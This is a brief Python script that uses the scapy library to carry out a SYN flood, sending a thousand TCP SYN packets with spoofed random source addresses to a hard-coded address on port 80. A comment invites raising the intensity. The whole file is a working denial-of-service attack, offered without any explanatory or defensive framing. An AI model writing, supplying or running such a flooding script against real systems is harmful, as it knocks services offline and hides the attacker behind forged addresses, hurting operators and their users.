from scapy.all import *

def syn_flood(target_ip, target_port):
    for i in range(1000):  # Adjust the range for intensity
        IP_layer = IP(src=RandIP(), dst=target_ip)
        TCP_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = IP_layer / TCP_layer
        send(packet, verbose=0)

syn_flood('192.168.1.184', 80)
